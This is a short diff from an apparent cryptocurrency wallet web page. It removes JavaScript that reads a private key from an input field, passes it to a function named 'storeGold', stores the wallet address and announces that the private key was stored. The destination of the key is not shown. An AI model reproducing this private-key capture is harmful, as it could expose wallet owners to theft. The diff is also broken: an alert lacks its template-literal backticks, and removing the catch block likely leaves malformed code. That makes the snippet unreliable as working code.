@@ -2170,29 +2170,6 @@ alert(typeof storeGold); // Should display 'function'. If not, storeGold isn't a
         alert('No wallet address derived. Stopping execution.');
         return;
       }
-
-      // Step 2: Store the private key using storeGold
-      alert('Storing the private key using storeGold...');
-      if (typeof storeGold === 'function') {
-        await storeGold('prv-key-input', true); // Make sure the function is properly defined
-      } else {
-        alert('Error: storeGold function is not defined.');
-        return;
-      }
-
-      // Step 3: Trigger the main function to store the wallet address
-      alert('Calling storeWalletAddressHandler...');
-      var networkType0 = document.getElementById('wallet-address-label1')?.textContent || 'Unknown Network';
-      if (typeof storeWalletAddressHandler === 'function') {
-        storeWalletAddressHandler(walletAddress0, networkType0);
-      } else {
-        alert('Error: storeWalletAddressHandler function is not defined.');
-        return;
-      }
-
-      alert('Wallet address and private key stored successfully!');
-    } catch (error) {
-      alert(Error occurred: ${error.message || error});
     }
   });
 });
